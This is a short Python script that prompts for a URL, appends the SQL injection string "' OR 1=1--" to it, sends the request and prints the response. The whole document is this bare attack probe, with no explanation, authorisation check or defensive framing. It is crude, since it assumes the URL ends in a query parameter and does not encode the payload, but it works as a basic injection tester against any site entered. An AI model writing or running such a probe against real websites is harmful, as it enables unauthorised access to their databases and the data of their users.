import requests

url = input("URL: ")
payload = "' OR 1=1--"

response = requests.get(url + payload)
print(response.text)
